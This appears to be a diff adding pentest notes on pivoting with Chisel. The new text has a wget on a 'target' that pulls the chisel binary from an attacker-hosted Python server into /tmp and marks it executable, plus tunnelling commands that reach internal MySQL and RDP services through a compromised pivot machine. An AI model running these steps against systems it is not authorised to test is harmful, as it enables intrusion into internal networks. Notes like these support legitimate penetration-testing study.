@@ -115,6 +115,15 @@ sudo apt install chisel -y
 ```
 
 ## Transfer Chisel to Target
+#### Using Python HTTP Server
+```
+# On Kali (attacker machine)
+python3 -m http.server 8000
+
+# On target
+wget http://10.10.10.5:8000/chisel -O /tmp/chisel
+chmod +x /tmp/chisel
+```
 
 **Because Chisel works like a tunnel bridge:**
 
@@ -125,3 +134,80 @@ sudo apt install chisel -y
 1) Chisel Client (runs on Windows)
 - connects back to Kali
 - forwards internal ports through itself
+
+**example:**
+- You (Kali) cannot access internal service: `10.10.10.20:80`
+- But the compromised Windows machine can access it
+
+
+##  Forward Port Forwarding (Local)
+
+**Goal:** Access a remote service through a local port
+```
+Your Machine          Chisel Server          Target Service
+   (Local)      ──────►  (Tunnel)  ──────►   (Remote)
+localhost:8080        10.10.10.100        192.168.1.50:3306
+```
+
+### setup chisel 
+```
+# Server side
+chisel server --port 9000 --reverse
+
+# Client side
+chisel client <server_ip>:9000 <local_port>:<target_ip>:<target_port>
+```
+
+## Example 2: Access Remote RDP
+```bash
+# Server (pivot machine)
+chisel server --port 9000 --reverse
+
+# Client (your machine)
+chisel client 10.10.10.100:9000 3389:192.168.1.100:3389
+
+# Connect using RDP client
+rdesktop localhost:3389
+# Or
+xfreerdp /u:Administrator /p:Password /v:localhost:3389
+```
+
+
+## Example 1: Access Remote MySQL Database
+
+**Scenario:**
+- MySQL runs on 192.168.1.50:3306 (only accessible from 10.10.10.100)
+- You want to access it from your Kali machine (10.10.10.5)
+
+**Solution:**
+```
+# Step 1: Start Chisel server on pivot machine (10.10.10.100)
+chisel server --port 9000 --reverse
+
+# Step 2: On your Kali machine (10.10.10.5)
+chisel client 10.10.10.100:9000 8080:192.168.1.50:3306
+
+# Step 3: Connect to MySQL via localhost
+mysql -h 127.0.0.1 -P 8080 -u root -p
+```
+
+**Breakdown:**
+- 8080 = Local port on your Kali machine
+- 192.168.1.50:3306 = Remote MySQL server
+- Traffic to localhost:8080 → tunneled → 192.168.1.50:3306
+
+
+___
+
+
+#  Reverse Port Forwarding (Remote)
+
+The victim machine opens a port, and traffic coming to that port is forwarded back to the attacker (or another system).
+
+**Goal:** Expose a service on target machine to your attacker machine
+```
+Attacker Machine     Chisel Client        Target Machine
+   (Receiver)    ◄────── (Tunnel) ◄──────  (Sender)
+localhost:8080        Connection        Internal Service
+```
+**Use Case:** Target can't reach you directly (firewall blocks incoming)
